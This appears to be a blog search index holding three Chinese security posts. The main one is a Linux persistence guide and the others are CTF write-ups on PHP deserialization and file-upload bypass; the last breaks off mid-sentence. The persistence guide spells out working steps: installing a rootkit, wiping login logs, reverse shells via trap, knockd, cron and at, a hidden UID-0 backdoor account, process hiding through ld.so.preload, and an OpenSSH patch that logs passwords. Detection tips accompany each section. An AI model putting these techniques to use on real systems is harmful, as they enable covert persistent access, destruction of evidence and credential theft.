<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>linux持久化及安全检测</title>
    <link href="/2019/12/21/linux%E6%8C%81%E4%B9%85%E5%8C%96/"/>
    <url>/2019/12/21/linux%E6%8C%81%E4%B9%85%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="linux持久化及安全检测"><a href="#linux持久化及安全检测" class="headerlink" title="linux持久化及安全检测"></a>linux持久化及安全检测</h1><p>结合<a href="http://vulhub.org.cn/attack" target="_blank" rel="noopener">ATT&amp;CK</a>和网上一些资料做了些持久化总结，供学习和交流，如有不足处，欢迎斧正。<strong>勿用于非法途径，否则后果自负。</strong></p><h2 id="1-Rootkit"><a href="#1-Rootkit" class="headerlink" title="1.    Rootkit"></a>1.    Rootkit</h2><p>rootkit分为内核级和应用级两种。<br>内核级的rootkit很多，比如：Diamorphine<br>应用级的rootkit也很多，比如：Mafix</p><h3 id="Mafix"><a href="#Mafix" class="headerlink" title="Mafix"></a>Mafix</h3><p>条件:root权限shell<br>Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。应用级rookit，主要替换ls、ps、netstat命令来隐藏文件(利用/proc?)</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><pre><code>wget http://forum.eviloctal.com/attachment.php?aid=13419tar zvxf mafix.tar.gzcd mafixchmod +x root./root password port</code></pre><p><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.1.png" srcset="/img/loading.gif" alt="1.1"><br>安装完成，自动删除安装程序<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.2.png" srcset="/img/loading.gif" alt="1.2"><br>netstat -an|grep 20000<br>检验安装情况</p><p>windows putty登录后门<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.3.png" srcset="/img/loading.gif" alt="1.3"><br>登陆成功日志<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.4.png" srcset="/img/loading.gif" alt="1.4"></p><h4 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h4><p>清理命令记录：<br>(1)仅清理当前用户： history -c<br>(2)使系统不再保存命令记录：vi /etc/profile，找到HISTSIZE这个值，修改为0<br>(3)删除记录<br>删除登录失败记录：echo&gt;/var/log/btmp<br>删除登录成功记录：echo&gt;/var/log/wtmp （此时执行last命令就会发现没有记录）删除日志记录：echo &gt; /var/log/secure  </p><h4 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h4><blockquote><p>Rkhunter</p></blockquote><p>Rkhunter的中文名叫“Rootkit猎手”, 目前可以发现大多数已知的rootkits和一些嗅探器以及后门程序. 它通过执行一系列的测试脚本来确认服务器是否已经感染rootkits. 比如检查rootkits使用的基本文件, 可执行二进制文件的错误文件权限, 检测内核模块等等。<br>rkhunter -c<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.5.png" srcset="/img/loading.gif" alt="1.5"><br>ssh的远程root登陆开启了，默认是不允许直接root登陆的</p><blockquote><p>Chkrootkit  </p></blockquote><p>当然如果只是用Rkhunter检查扫描还是不够权威，再来安装一款检查下吧，chkrootkit 是一款小巧易用的Unix平台上的可以检测多种rootkit入侵的工具。它的功能包括检测文件修改、utmp/wtmp/last日志修改、界面欺骗(promiscuous interfaces)、恶意核心模块(maliciouskernel modules)。<br>直接运行可以对系统进行检测： /usr/local/chkrootkit/chkrootkit（./chkrootkit -n）<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.6.png" srcset="/img/loading.gif" alt="1.6"><br>也可以./chkrootkit | grep INFECTED<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.7.png" srcset="/img/loading.gif" alt="1.7"><br>出现INFECTED就说明系统可能有问题了</p><h2 id="2-Trap"><a href="#2-Trap" class="headerlink" title="2.    Trap"></a>2.    Trap</h2><p>trap 命令使程序和 shell 可以指定接收中断信号时执行的命令。 一种常见的情况是脚本允许正常终止和处理常见的键盘中断，如 ctrl+c 和 ctrl+d。当 shell 遇到特定的中断时，攻击者可以使用它来注册要执行的代码，以获得执行或作为持久性机制。 Trap 命令的格式如下：trap“命令列表”signals，当接收时到“signals”，将执行“命令列表”。 </p><h3 id="trap命令"><a href="#trap命令" class="headerlink" title="trap命令"></a>trap命令</h3><p>trap命令是专用于捕捉信号的。比如像Ctrl+C组合键会产生SIGINT信号，Ctrl+Z会产生SIGTSTP信号发送给终端等。在捕捉到信号之后，可以进行一系列的操作。<br><strong>用法</strong>：trap ‘command’ signals<br>比如：trap “echo ‘You pressed the ctrl+c ‘“ INT<br> 当按下ctrl+c，输出”You pressed the ctrl+c”<br>trap -l查看其他信号</p><h3 id="trap后门"><a href="#trap后门" class="headerlink" title="trap后门"></a>trap后门</h3><p>编写shell脚本：<br>test.sh</p><pre><code>#!/bin/bash  # test trap command  trap &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1&quot; SIGINT  //payloadecho This is a test script  count=1  while [ $count -le 10 ]  do    echo &quot;hu $count&quot;    sleep 1    count=$[ $count + 1 ]  done  echo The end.  </code></pre><p>运行test脚本，当我们执行中断信号(ctrl+c)的时候，触发trap。<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%962.1.png" srcset="/img/loading.gif" alt="2.1"><br>成功反弹shell。<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%962.2.png" srcset="/img/loading.gif" alt="2.2"><br><strong>安全检测</strong><br>必须为 shell 或程序注册 trap 命令，因此它们出现在文件中。 监视文件是否存在可疑或过于宽泛的 trap 命令可以减少调查期间的可疑行为。 监视通过 trap 中断执行的可疑进程。<br>参考<br><a href="https://www.cnblogs.com/FengGeBlog/p/10407221.html" target="_blank" rel="noopener">https://www.cnblogs.com/FengGeBlog/p/10407221.html</a></p><h2 id="3-端口敲击"><a href="#3-端口敲击" class="headerlink" title="3.    端口敲击"></a>3.    端口敲击</h2><h3 id="什么是knock"><a href="#什么是knock" class="headerlink" title="什么是knock"></a>什么是knock</h3><p>端口敲击是一种较为成熟的技术，目的是隐藏开放的端口以控制访问，攻击者和防御者均可使用。 为了启用端口，攻击者需发送一系列具有特定特征的数据包。 通常，这些数据包包含关闭端口预定义的尝试序列，这可能涉及不常见的标志、特定的字符串或其他特征。 完成序列，通常由基于主机的防火墙开启端口，但也可以由自定义软件打开。 在动态开启监听端口和在不同系统上启动与监听服务器的连接时，都可以见到该技术。 可以通过不同的方法观察引发通信的数据包。 一种方法（最初由 Cd00r 实现）是使用 libpcap 库嗅探有问题的包。 另一种方法利用了原始套接字，这使得恶意软件可以使用供其他程序使用的开放端口。<br>Knocked工具安装<br>环境：centos7<br>下载knocked <a href="http://www.zeroflux.org/projects/knock" target="_blank" rel="noopener">http://www.zeroflux.org/projects/knock</a></p><ol><li>wget <a href="http://404-1252074372.cosgz.myqcloud.com/knockd/knock-0.7-1.el7.src.rpm" target="_blank" rel="noopener">http://404-1252074372.cosgz.myqcloud.com/knockd/knock-0.7-1.el7.src.rpm</a></li><li>安装rpmbuild：yum install -y rpm-build</li><li>安装 libpcap-devel：yum install -y libpcap-devel</li><li>安装gcc：yum install -y gcc</li><li>编译knockd：rpmbuild –rebuild knock-0.7-1.el7.src.rpm </li><li>安装knockd：rpm -ivh /root/rpmbuild/RPMS/x86_64/knock-*<br>此时knocked安装成功。<br>最后</li><li>根据自己的需要进行配置：/etc/knockd.conf</li><li>启动knocked服务： /etc/init.d/knockd start<br>作为安全管理工具，knocked可以隐藏自己的端口，当管理员正确敲击端口”密码序列”，knocked打开预先设定好的端口，让管理员访问。<br>比如管理员想要用手中的设备进行ssh连接，knocked配置如下：<pre><code>[options]    LogFile = /var/log/knockd.log  //日志地址</code></pre></li></ol><p>[opencloseSSH]<br>        sequence = 1000,1001,1002<br>        seq_timeout   = 15<br>        tcpflags = syn<br>        start_command = iptables -I INPUT -s %IP% -p tcp –dport ssh -j ACCEPT<br>        cmd_timeout   = 10<br>        stop_command  = /sbin/iptables -D INPUT -s %IP% -p tcp –dport ssh -j ACCEPT  </p><pre><code>当依次敲击1000，1001，1002三个端口后，服务器添加一条iptables规则iptables -I INPUT -s %IP% -p tcp --dport ssh -j ACCEPT，允许敲击正确的ip通过ssh端口访问服务器。端口敲击序列  ![3.1](/img/持久化3.1.png)   查看日志(/var/log/knockd.log)，判断是否敲击成功  如果第一个暗号被接受了，会记录下来：  xxx.xxx.xxx.xxx : opencloseSSH: Stage 1  后依次接收第二第三个暗号，成功执行opencloseSSH  ![3.2](/img/持久化3.2.png)   knocked日志  遇到的坑：  每次更改配置记得restart服务如果接收不到，可能是部分端口被禁止了，或者没开icmp（如果是vps上搭建，多半是这个原因，去改安全策略）### Knock后门利用knocked可以构建我们的后门在knocked加入一个功能：</code></pre><p>[Bounce shell]<br>        sequence = 1000,1001,1002<br>        seq_timeout = 30<br>        tcpflags = syn<br>        tart_command = bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1  </p><pre><code>在我们的攻击机上开启监听：nc -lvp 2333  依次敲击1000 1001 1002，反弹shell   ![3.3](/img/持久化3.3.png)   ### 安全检测记录查看发送到系统和从系统发出的网络数据包，查找不属于已建立的无关数据包。  参考https://cloud.tencent.com/developer/article/1005328http://vulhub.org.cn/attack/techniques/T1205.md## 4.    新建账户具有足够访问级别的攻击者可以创建本地系统或域帐户。 这些帐户可用持久化，不需要在系统上部署持久远程访问工具。  ### useradd命令和两个文件  **useradd**  条件：超级用户权限  格式：useradd [-d home] [-s shell] [-c comment] [-m [-k template]] [-f inactive] [-e expire ] [-p passwd] [-r] name  参数：   -c：加上备注文字，备注文字保存在passwd的备注栏中。  　　-d：指定用户登入时的主目录，替换系统默认值/home/&lt;用户名&gt;  　　-D：变更预设值。  　　-e：指定账号的失效日期，日期格式为MM/DD/YY，例如06/30/12。缺省表示永久有效。  　　-f：指定在密码过期后多少天即关闭该账号。如果为0账号立即被停用；如果为-1则账号一直可用。默认值为-1.  　　-g：指定用户所属的群组。值可以使组名也可以是GID。用户组必须已经存在的，期默认值为100，即users。  　　-G：指定用户所属的附加群组。  　　-m：自动建立用户的登入目录。  　　-M：不要自动建立用户的登入目录。  　　-n：取消建立以用户名称为名的群组。  　　-r：建立系统账号。  -s：指定用户登入后所使用的shell。默认值为/bin/bash。  例如：  建立一个新用户账户testuser1，并设置UID为544，主目录为/usr/testuser1，属于users组：  #useradd -u 544 -d /usr/testuser1  -g users -m  testuser1  **/etc/passwd和/etc/shadow**/etc/passwd：用户信息文件各字段   用户名：密码：用户ID：组ID：身份描述：用户的家目录：用户登录后所使用的SHELL/etc/shadow：用户密码信息  文件各字段  用户名：密码的MD5加密值：数字表示自系统使用以来口令被修改的天数：数字表示口令的最小修改间隔：数字表示口令更改的周期：数字表示口令失效的天数：数字表示口令失效以后帐号会被锁定多少天：用户帐号到期时间：保留字段尚未使用新建账户  环境：  Centos 7(靶机)  Ubuntu 16(攻击机）  Useradd -o -u 0 backdoor # 添加账户“backdoor” UID为0（root权限）  echo &quot;123456&quot; | passwd --stdin backdoor      # 设置密码  通过ssh远程登录backdoor账户### 安全检测收集建立账户的数据，定期检查自己的账户。参考https://www.cnblogs.com/EdwinChan/p/8350879.html## 5.    隐藏文件和目录### 隐藏文件和目录Linux下创建文件和目录，在命名前加一个“.“代表隐藏。touch .webshell.php 创建名字为 .webshell.php 的文件mkdir …/ 创建名字为 … 的文件夹ls命令无法查看，ls -a可查看隐藏文件及目录### 隐藏历史操作命令1.关闭当前记录  关闭 set +o history  开启 set -o history  Ps：命令前加空格，命令本身也不会被记录。  2.清除历史记录  查看历史记录：#history  历史记录保存的位置：#cat /root/.bash_history  ### 端口隐藏  **通过端口复用来隐藏端口**  #### 1.SSLH  安装SSLH   sudo apt-get install sslh  配置SSLH 编辑 SSLH 配置文件：   sudo vi /etc/default/sslh   找到下列行：Run=no  将其修改为：Run=yes   修改以下行以允许 SSLH 在所有可用接口上侦听端口 443   DAEMON_OPTS=&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid&quot;  **安全检测**ps -ef | grep sslh 查看端口#### 2.iptables端口复用链  iptables -t nat -N LETMEIN  端口复用规则  iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22  开启开关  iptables -A INPUT -p tcp -m string --string &#39;threathuntercoming&#39; --algo bm -m recent --set --name letmein --rsource -j ACCEPT  关闭开关  iptables -A INPUT -p tcp -m string --string &#39;threathunterleaving&#39; --algo bm -m recent --name letmein --remove -j ACCEPT  let&#39;s do it  iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN  **利用方式:**开启复用  echo threathuntercoming | socat - tcp:192.168.28.128:80  ssh使用80端口进行登录  ssh -p 80 root@192.168.28.128  关闭复用  echo threathunterleaving | socat - tcp:192.168.28.128:80  具体参考：  https://www.freebuf.com/articles/network/137683.html### 隐藏进程**Libprocesshider**  利用 LD_PRELOAD 来实现系统函数的劫持下载程序编译  git clone https://github.com/gianlucaborello/libprocesshider.git  cd libprocesshider/ &amp;&amp; make  移动文件到/usr/local/lib/目录下  cp libprocesshider.so /usr/local/lib/  把它加载到全局动态连接局  echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload  运行evil_script.py测试  ./evil_script.py 127.0.0.1 2333  Top命令无法找到evil_script.py  **安全检测**  unhide 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP / UDP端口。  安装  sudo yum install unhide  使用  unhide [options] test_list   ![5.1](/img/持久化5.1.png)   ## 6.    预加载型恶意动态链接库动态链接库预加载机制是系统提供给用户运行自定义动态链接库的一种方式，在可执行程序运行之前就会预先加载用户定义的动态链接库的一种技术，这种技术可以重写系统的库函数，这种技术可以用来重写系统中有漏洞的库函数，达到修复漏洞的目的，但也可以被用来劫持。  ![6.1](/img/持久化6.1.png)    LD_PRELOAD （用于预加载的环境变量）  LD_PRELOAD环境变量是会及时生效的  LD_PRELOAD=/lib/evil.so #LD_PRELOAD的值设置为要预加载的动态链接库  export LD_PRELOAD        #导出环境变量使该环境变量生效  unset LD_PRELOAD         #解除设置的LD_PRELOAD环境变量  常用工具：cub3 https://github.com/mempodippy/cub3  /etc/ld.so.preload （用于预加载的配置文件）  将恶意so文件写入/etc/ld.so.preload就行:  echo “/lib/evil.so” &gt; /etc/ld.so.preload  常用工具：Vlany  https://github.com/mempodippy/vlany  ### 安全检测通过strace命令去跟踪预加载的文件是否为/etc/ld.so.preload，以及文件中是否有异常的动态链接库,文件完整性校验。以及检查是否设置LD_PRELOAD环境变量(echo $LD_PRELOAD)等。## 7.    本地作业调度本地作业调度就是常说的计划任务### cron通过修改/etc/crontab，/etc/cron.d/目录或 Cron 守护进程支持的其他位置可以安装系统级的 cron 作业。而每个用户的 Cron 作业是通过 crontab 使用具有特定格式的 crontab 文件安装的。­它在 macOS 和 Linux 系统上都有效。  这些方法允许在没有用户交互的情况下在后台以特定的周期间隔执行命令或脚本。攻击者可以利用作业调度在系统启动时执行程序或为了持久性而在预定的基础上执行程序， 作为横向移动的一部分执行，获取 root 权限，或者在特定帐户的上下文中运行进程。  靶机上设定计划任务：  (crontab -l;echo &#39;*/1 * * * * exec 9&lt;&gt; /dev/tcp/127.0.0.1/2333;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&#39;)|crontab -  1分钟后攻击机上成功监听：  ### atat 程序是另一种方式，基于 POSIX 的系统（包括 macOS 和 Linux)。用于将程序或脚本作业安排在之后的日期和/或时间执行的一次性任务(cron多次)。   [root@localhost ~]# date             # 查看当前时间  [root@localhost ~]# at 00:27        # 创建at计划任务  +  时间  at&gt; bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1                    # 在08：26  bash命令反弹shell  at&gt; \&lt;EOT&gt;                            # Ctrl+D  结束    8：26攻击机上成功监听### 安全检测一般通过crontab -l（at -l等）命令即可检测到定时任务后门。不同的linux发行版可能查看开机启动项的文件不大相同，Debian系linux系统一般是通过查看/etc/init.d目录有无最近修改和异常的开机启动项。而Redhat系的linux系统一般是查看/etc/rc.d/init.d或者/etc/systemd/system等目录。## 8.    Openssh通过在openssh源码中插入恶意代码并进行重新编译来替换原有sshd文件。插入的恶意代码可以是将登录成功的用户密码发送到远程服务器或者记录到某个log文件中。在openssh目录中找到includes.h文件。安装后门  环境：centos6.9  下载openssh-5.9p1.tar.gz  wget http://ftp.jaist.ac.jp/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz  下载后门文件  wget http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz  解压  &gt;tar zxvf openssh-5.9p1.tar.gz  tar zxvf openssh-5.9p1.patch.tar.gz    复制patch后门文件到正常openssh里面  &gt;cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1  patch &lt; sshbd5.9p1.diff   ![8.1](/img/持久化8.1.png)     修改后门密码和文件记录 vim includes.h&gt;int secret_ok;  FILE *f;  #define ILOG &quot;/tmp/ilog&quot;  # 记录登录到本机的用户名和密码  #define OLOG &quot;/tmp/olog&quot;  # 记录本机登录到远程的用户名和密码  #define SECRETPW &quot;test&quot; # 远程连接密码  #endif /* INCLUDES_H */    编译安装  &gt;yum install -y openssl openssl-devel pam-devel zlib zlib-devel  ./configure --prefix=/usr/ --sysconfdir=/etc/ssh/ --with-pam --with-kerberos5  make clean  make &amp;&amp; make install  service sshd start （centos7：systemctl restart sshd.service）  攻击机连接后门![8.2](/img/持久化8.2.png)     ### 安全检测1、查看Openssh版本  ssh -V  2、查看ssh配置文件和/usr/sbin/sshd的时间  stat /usr/sbin/sshd  #时间和版本都是可以修改的，所以不靠谱  3、查看日志  more /var/log/secure | grep &quot;Accepted&quot; | awk &#39;{print $11}&#39; | uniq  4、通过strace监控sshd进程读写文件的操作  ps axu | grep sshd | grep -v grep #sshd父进程ID  strace -o sshd -ff -p 2908  grep open sshd* | grep -v -e No -e null -e denied| grep WR  5、一般的openssh后门都会将账户密码记录到文件或者发送到邮箱中  strings /usr/sbin/sshd |grep &#39;[1-9]{1,3}.[1-9]{1,3}.&#39;  strings /usr/sbin/sshd |grep &#39;@&#39;  </code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP序列化</title>
    <link href="/2018/09/13/PHP%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2018/09/13/PHP%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p> 在PHP中，序列化用于存储或传递 PHP 的值（比如数组或者类的值）的过程中，同时不丢失其类型和结构。大概就是将数组和类的值转换成字符串来传值。</p><p>序列化</p><ul><li>serialize ( mixed $value )</li></ul><p>反序列化</p><ul><li>unserialize ( mixed $value )</li></ul><h3 id="序列化例子"><a href="#序列化例子" class="headerlink" title="序列化例子"></a>序列化例子</h3><h4 id="类的序列化"><a href="#类的序列化" class="headerlink" title="类的序列化"></a>类的序列化</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class test</span><br><span class="line">&#123;</span><br><span class="line">var $name;</span><br><span class="line">var $age;</span><br><span class="line">function __construct($name,$age)</span><br><span class="line">&#123;</span><br><span class="line">$this -&gt; name &#x3D; $name;</span><br><span class="line">$this -&gt; age &#x3D; $age;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test1 &#x3D; new test(&#39;lmt&#39;,&#39;3&#39;);</span><br><span class="line">echo &quot;before serialize&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">var_dump($test1);</span><br><span class="line">echo &quot;&lt;br&gt; after serialize &lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">var_dump(serialize($test1));</span><br></pre></td></tr></table></figure><p>输出结果</p><blockquote><p>O:4:”test”:2:{s:4:”name”;s:3:”lmt”;s:3:”age”;s:1:”3”;}</p></blockquote><blockquote><p>O:4:”test”:2：表示，序列化的是一个类（object），类名的长度为4，类中有两个变量名</p></blockquote><h3 id="序列化相关的题"><a href="#序列化相关的题" class="headerlink" title="序列化相关的题"></a>序列化相关的题</h3><p>welcome to the bugku</p><p><a href="http://123.206.87.240:8006/test1/" target="_blank" rel="noopener">http://123.206.87.240:8006/test1/</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user &#x3D; $_GET[&quot;txt&quot;];  </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];  </span><br><span class="line">$pass &#x3D; $_GET[&quot;password&quot;];  </span><br><span class="line">if(isset( $user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))</span><br><span class="line">&#123;  </span><br><span class="line"> echo &quot;hello admin!&lt;br&gt;&quot;;  </span><br><span class="line"> include($file); &#x2F;&#x2F;hint.php  </span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;  </span><br><span class="line"> echo &quot;you are not admin ! &quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很显然想让我们利用源码去得到flag。</p><p>开始有三个变量：user,file,pass，但是我们发现这里的pass也就是password没有什么用，所以我们重点关注前两个变量。看下面的条件</p><p>（1）这里isset的意思是查看变量是否存在，即user不能为空。<br>（2）file_get_contents是把整个文件读入字符串中，这里也就是把user这个变量（user显然要是一个文件）的内容以字符串的方式读出来并且要和“welcome to the bugkuctf”完全相等（类型，内容）。</p><ul><li>file_get_contents($user,’r’)<br>（3）后面提示了我们所以我们要在满足条件之后读取file=hint.php。</li><li>include($file); //hint.php</li></ul><p>这里就要使用php伪协议了。这道题目为了解决第二个条件，要用到    “php://input”协议。<br>然后我们在文件包含出hint.PHP</p><ul><li><a href="http://120.24.86.145:8006/test1/index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php" target="_blank" rel="noopener">http://120.24.86.145:8006/test1/index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</a></li></ul><p><img src="/img/2.png" srcset="/img/loading.gif" alt="图片"></p><p>解码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#hint.php  </span><br><span class="line"></span><br><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">class Flag&#123;&#x2F;&#x2F;flag.php    </span><br><span class="line">    public $file;    </span><br><span class="line">    public function __tostring()&#123;    </span><br><span class="line">        if(isset($this-&gt;file))&#123;    </span><br><span class="line">            echo file_get_contents($this-&gt;file);   </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;  </span><br><span class="line">        return (&quot;good&quot;);  </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>利用伪协议包含出index.php</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#index.php  </span><br><span class="line">&lt;?php    </span><br><span class="line">$txt &#x3D; $_GET[&quot;txt&quot;];    </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];    </span><br><span class="line">$password &#x3D; $_GET[&quot;password&quot;];    </span><br><span class="line"></span><br><span class="line">if(isset($txt)&amp;&amp;(file_get_contents($txt,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))&#123;    </span><br><span class="line">    echo &quot;hello friend!&lt;br&gt;&quot;;    </span><br><span class="line">    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;   </span><br><span class="line">        echo &quot;不能现在就给你flag哦&quot;;  </span><br><span class="line">        exit();    </span><br><span class="line">    &#125;else&#123;    </span><br><span class="line">        include($file);     </span><br><span class="line">        $password &#x3D; unserialize($password);    </span><br><span class="line">        echo $password;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;else&#123;    </span><br><span class="line">    echo &quot;you are not the number of bugku ! &quot;;    </span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line">?&gt;    </span><br><span class="line"></span><br><span class="line">&lt;!--    </span><br><span class="line">$user &#x3D; $_GET[&quot;txt&quot;];    </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];    </span><br><span class="line">$pass &#x3D; $_GET[&quot;password&quot;];    </span><br><span class="line"></span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))&#123;    </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;    </span><br><span class="line">    include($file); &#x2F;&#x2F;hint.php    </span><br><span class="line">&#125;else&#123;    </span><br><span class="line">    echo &quot;you are not admin ! &quot;;    </span><br><span class="line">&#125;    </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>indep.php中 <strong>preg_match(“/flag/“,$file)</strong> 不能直接包含出flag.php</p><p>但是hint.php里有 <strong>class Flag{//flag.php</strong><br>以及</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include($file);     </span><br><span class="line">  $password &#x3D; unserialize($password);    </span><br><span class="line">  echo $password;</span><br></pre></td></tr></table></figure><p>所以这里file参数须是hint.php，因为只有在hint.php中才会包含类Flag<br>然后我们构造password把参数传进hint.php</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    class Flag&#123;</span><br><span class="line">    public $file;    </span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    $a &#x3D; new Flag();  </span><br><span class="line">    $a-&gt;file &#x3D; &quot;flag.php&quot;;  </span><br><span class="line">    $a &#x3D; serialize($a);  </span><br><span class="line">    print_r($a);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出</p><ul><li>O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</li></ul><p><img src="/img/3.png" srcset="/img/loading.gif" alt="3"></p><p><img src="/img/4.png" srcset="/img/loading.gif" alt="4"></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>php</tag>
      
      <tag>序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计_文件上传ctf题</title>
    <link href="/2018/09/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0ctf%E9%A2%98/"/>
    <url>/2018/09/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0ctf%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>网鼎杯第二场 wafUpload</p><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><pre><code>&lt;?phpm#$sandbox = &#39;/var/www/html/upload/&#39; . md5(&quot;phpIsBest&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);$sandbox = &#39;&#39;;#@mkdir($sandbox);#@chdir($sandbox);if (!empty($_FILES[&#39;file&#39;])) {    #mime check    if (!in_array($_FILES[&#39;file&#39;][&#39;type&#39;], [&#39;image/jpeg&#39;, &#39;image/png&#39;, &#39;image/gif&#39;])) {        die(&#39;This type is not allowed!&#39;);    }else{        echo &quot;pass 1n&quot;;    }    #check filename    $file = empty($_POST[&#39;filename&#39;]) ? $_FILES[&#39;file&#39;][&#39;name&#39;] : $_POST[&#39;filename&#39;];    if (!is_array($file)) {        $file = explode(&#39;.&#39;, strtolower($file));    }    $ext = end($file);    if (!in_array($ext, [&#39;jpg&#39;, &#39;png&#39;, &#39;gif&#39;])) {        die(&#39;This file is not allowed!&#39;);    }else{        echo &quot;pass 2n&quot;;    }    $filename = reset($file) . &#39;.&#39; . $file[count($file) - 1];    if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $sandbox . &#39;/&#39; . $filename)) {        echo &#39;Success!&#39;;        echo &#39;filepath:&#39; . $sandbox . &#39;/&#39; . $filename;    } else {        echo &#39;Failed!&#39;;    }}show_source(__file__);?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Upload Your Shell&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;    &lt;input type=&quot;text&quot; name=&quot;filename&quot;&gt;&lt;br&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>审计源码可以知道，代码中用 end 函数取到上传文件的后缀并判断，用 reset 函数返回的值作为文件名</p><p>根据题目，需要绕过两层判断。</p><p>1.第一层，直接抓包修改 MIME 为 image/png 就行了。</p><p>2.第二层，构造 filename 字段为数组</p><p>仔细看 html 代码中提供了一个 filename 字段，在下面这句代码的判断中，会先查看是否有直接 post 提交的 filename 字段，如果有的话就使用这个字段的值</p><blockquote><p>$file = empty($_POST[‘filename’]) ? $_FILES[‘file’][‘name’] : 